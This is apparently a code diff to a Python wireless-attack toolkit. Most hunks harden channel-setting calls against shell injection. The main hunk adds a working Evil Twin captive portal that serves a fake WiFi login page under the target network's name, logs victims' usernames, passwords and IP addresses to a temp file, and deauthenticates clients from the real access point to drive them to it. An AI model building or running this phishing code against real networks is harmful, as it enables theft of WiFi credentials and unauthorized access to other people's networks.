@@ -294,8 +294,12 @@ class PMKIDAttack(Attack):
                 int.from_bytes(os.urandom(1), 'big') for _ in range(5)
             )
 
-            # Set channel
-            os.system(f"iw dev {iface} set channel {channel} 2>/dev/null")
+            # Set channel (safe from injection - no shell involved)
+            import subprocess
+            subprocess.run(
+                ["iw", "dev", iface, "set", "channel", str(channel)],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            )
 
             # Send Open System Authentication
             auth_frame = (
@@ -594,8 +598,12 @@ class DeauthHandshakeAttack(Attack):
 
             iface = self._interface or conf.iface
 
-            # Set channel
-            os.system(f"iw dev {iface} set channel {channel} 2>/dev/null")
+            # Set channel (safe from injection - no shell involved)
+            import subprocess as _sp
+            _sp.run(
+                ["iw", "dev", iface, "set", "channel", str(channel)],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+            )
 
             # Track EAPOL frames per client
             eapol_frames: Dict[str, List] = {}
@@ -834,14 +842,20 @@ class EvilTwinAttack(Attack):
         self, bssid: str, ssid: str, channel: int, timeout: float
     ) -> Optional[Dict[str, Any]]:
         """
-        Start Evil Twin using hostapd + dnsmasq + captive portal.
+        Start Evil Twin using hostapd + dnsmasq + captive portal HTTP server.
 
         This is the production implementation that:
         1. Configures hostapd for open AP with target SSID
         2. Sets up dnsmasq for DHCP + DNS redirect
-        3. Starts lightweight HTTP server for credential capture
+        3. Starts lightweight HTTP captive portal server on 10.0.0.1:80
         4. Deauths clients from real AP
+        5. Polls for captured credentials submitted to the portal
         """
+        hostapd_proc = None
+        dnsmasq_proc = None
+        http_server = None
+        hostapd_conf_path = None
+
         try:
             from scapy.all import sendp, conf, RadioTap
             from scapy.layers.dot11 import Dot11, Dot11Deauth
@@ -851,6 +865,10 @@ class EvilTwinAttack(Attack):
             # Generate hostapd config
             import tempfile
             import subprocess
+            import socket
+            import threading as _threading
+            from http.server import HTTPServer, BaseHTTPRequestHandler
+            from urllib.parse import parse_qs
 
             hostapd_conf = tempfile.NamedTemporaryFile(
                 mode='w', suffix='.conf', delete=False
@@ -866,10 +884,109 @@ class EvilTwinAttack(Attack):
                 f"wpa=0\n"
             )
             hostapd_conf.close()
+            hostapd_conf_path = hostapd_conf.name
+
+            # Credential storage file
+            cred_file = Path("/tmp/evil_twin_creds.txt")
+            if cred_file.exists():
+                cred_file.unlink()
+
+            # --- Captive Portal HTTP Server ---
+            portal_ssid = ssid
+
+            class CaptivePortalHandler(BaseHTTPRequestHandler):
+                """HTTP handler that serves a phishing login page and captures creds."""
+
+                def log_message(self, format, *args):
+                    # Suppress noisy HTTP logs
+                    pass
+
+                def do_GET(self, _self=None):
+                    """Serve captive portal login page for any GET request."""
+                    html = (
+                        '<!DOCTYPE html><html><head>'
+                        '<meta name="viewport" content="width=device-width,initial-scale=1">'
+                        f'<title>{portal_ssid} - WiFi Login</title>'
+                        '<style>body{font-family:Arial,sans-serif;margin:0;padding:20px;'
+                        'background:#f5f5f5}form{max-width:400px;margin:50px auto;'
+                        'background:#fff;padding:30px;border-radius:8px;'
+                        'box-shadow:0 2px 10px rgba(0,0,0,.1)}'
+                        'h2{text-align:center;color:#333}input{width:100%;padding:12px;'
+                        'margin:8px 0;border:1px solid #ddd;border-radius:4px;'
+                        'box-sizing:border-box}button{width:100%;padding:12px;'
+                        'background:#4CAF50;color:#fff;border:none;border-radius:4px;'
+                        'cursor:pointer;font-size:16px}button:hover{background:#45a049}'
+                        '</style></head><body>'
+                        f'<form method="POST" action="/login">'
+                        f'<h2>{portal_ssid}</h2>'
+                        '<p style="text-align:center;color:#666">'
+                        'Please enter your WiFi password to connect</p>'
+                        '<input type="text" name="email" placeholder="Email or Username">'
+                        '<input type="password" name="password" '
+                        'placeholder="WiFi Password" required>'
+                        '<button type="submit">Connect</button></form>'
+                        '</body></html>'
+                    )
+                    self.send_response(200)
+                    self.send_header("Content-Type", "text/html")
+                    self.send_header("Content-Length", str(len(html)))
+                    # Force captive portal detection by various OS
+                    self.send_header("Cache-Control", "no-cache, no-store")
+                    self.end_headers()
+                    self.wfile.write(html.encode())
+
+                def do_POST(self, _self=None):
+                    """Capture submitted credentials from the login form."""
+                    content_length = int(self.headers.get("Content-Length", 0))
+                    body = self.rfile.read(content_length).decode(errors="replace")
+                    params = parse_qs(body)
+                    username = params.get("email", [""])[0]
+                    password = params.get("password", [""])[0]
+                    client_ip = self.client_address[0]
+
+                    if password:
+                        # Write credential to file for polling loop
+                        with open(str(cred_file), "a") as f:
+                            f.write(
+                                f"{username}|{password}|{client_ip}\n"
+                            )
+                        logger.info(
+                            "Captive portal credential captured from %s",
+                            client_ip,
+                        )
+
+                    # Show "connecting" response
+                    html = (
+                        '<!DOCTYPE html><html><head>'
+                        f'<title>{portal_ssid}</title></head><body>'
+                        '<h2 style="text-align:center;margin-top:80px">'
+                        'Connecting... Please wait.</h2>'
+                        '<p style="text-align:center;color:#666">'
+                        'You will be connected shortly.</p>'
+                        '</body></html>'
+                    )
+                    self.send_response(200)
+                    self.send_header("Content-Type", "text/html")
+                    self.send_header("Content-Length", str(len(html)))
+                    self.end_headers()
+                    self.wfile.write(html.encode())
+
+            # Start HTTP server on 10.0.0.1:80
+            try:
+                http_server = HTTPServer(("10.0.0.1", 80), CaptivePortalHandler)
+                http_server.timeout = 1.0
+                http_thread = _threading.Thread(
+                    target=self._run_http_server, args=(http_server,), daemon=True
+                )
+                http_thread.start()
+                logger.info("Captive portal HTTP server started on 10.0.0.1:80")
+            except OSError as e:
+                logger.warning("Could not start HTTP server: %s", e)
+                http_server = None
 
             # Start hostapd (non-blocking)
             hostapd_proc = subprocess.Popen(
-                ["hostapd", hostapd_conf.name],
+                ["hostapd", hostapd_conf_path],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
@@ -880,7 +997,7 @@ class EvilTwinAttack(Attack):
                 capture_output=True,
             )
 
-            # Start dnsmasq for DHCP + DNS wildcard
+            # Start dnsmasq for DHCP + DNS wildcard redirect
             dnsmasq_proc = subprocess.Popen(
                 [
                     "dnsmasq", "--no-daemon",
@@ -912,18 +1029,15 @@ class EvilTwinAttack(Attack):
                 sendp(deauth_frame, iface=iface, count=5, inter=0.05, verbose=False)
                 time.sleep(5.0)
 
-                # Check for captured credentials (would be via HTTP server)
-                cred_file = Path("/tmp/evil_twin_creds.txt")
+                # Check for captured credentials from the HTTP server
                 if cred_file.exists():
                     content = cred_file.read_text().strip()
                     if content:
-                        credential = content.split("\n")[-1]
+                        # Parse latest credential line: username|password|ip
+                        last_line = content.split("\n")[-1]
+                        parts = last_line.split("|")
+                        credential = parts[1] if len(parts) >= 2 else last_line
                         break
-
-            # Cleanup
-            hostapd_proc.terminate()
-            dnsmasq_proc.terminate()
-            os.unlink(hostapd_conf.name)
 
             if credential:
                 return {"password": credential, "method": "captive_portal"}
@@ -935,6 +1049,29 @@ class EvilTwinAttack(Attack):
         except Exception as e:
             logger.error("Evil Twin error: %s", e)
             return None
+        finally:
+            # Ensure all spawned processes and servers are cleaned up
+            if http_server:
+                http_server.shutdown()
+            if hostapd_proc:
+                hostapd_proc.terminate()
+                hostapd_proc.wait()
+            if dnsmasq_proc:
+                dnsmasq_proc.terminate()
+                dnsmasq_proc.wait()
+            if hostapd_conf_path:
+                try:
+                    os.unlink(hostapd_conf_path)
+                except OSError:
+                    pass
+
+    @staticmethod
+    def _run_http_server(server):
+        """Run the HTTP server until shutdown is called."""
+        try:
+            server.serve_forever()
+        except Exception:
+            pass
 
 
 class KarmaAttack(Attack):
@@ -1010,7 +1147,11 @@ class KarmaAttack(Attack):
             )
 
             iface = self._interface or conf.iface
-            os.system(f"iw dev {iface} set channel {channel} 2>/dev/null")
+            import subprocess as _sp
+            _sp.run(
+                ["iw", "dev", iface, "set", "channel", str(channel)],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+            )
 
             fake_bssid = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
                 int.from_bytes(os.urandom(1), 'big') for _ in range(5)
@@ -1156,7 +1297,11 @@ class WPA3DowngradeAttack(Attack):
             from scapy.layers.eap import EAPOL
 
             iface = self._interface or conf.iface
-            os.system(f"iw dev {iface} set channel {channel} 2>/dev/null")
+            import subprocess as _sp
+            _sp.run(
+                ["iw", "dev", iface, "set", "channel", str(channel)],
+                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+            )
 
             captured_eapol: List = []
 
